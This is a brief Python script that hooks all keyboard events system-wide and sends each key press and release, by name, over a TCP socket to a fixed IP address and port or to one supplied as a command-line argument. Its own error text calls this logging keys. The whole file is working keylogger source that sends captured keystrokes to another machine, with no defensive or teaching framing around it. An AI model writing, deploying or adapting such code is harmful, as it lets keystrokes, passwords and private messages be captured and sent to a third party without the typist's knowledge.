import sys
import socket               
import keyboard

trgtIP = '192.168.1.9'
port = 12346

if len(sys.argv)>1:
	inputIP = sys.argv[1]
	trgtIP = inputIP
	print("You've chosen to connect to: "+trgtIP)

def sendKey (e):
	global toggle
	global port
	global trgtIP
	s = socket.socket()         

	keyname = e.name
	key = e.event_type+" "+keyname
	try:
		s.connect((trgtIP, port))
		s.send(key.encode())
	except:
		print("Socket failed, can't log keys")

keyboard.hook(sendKey)
keyboard.wait()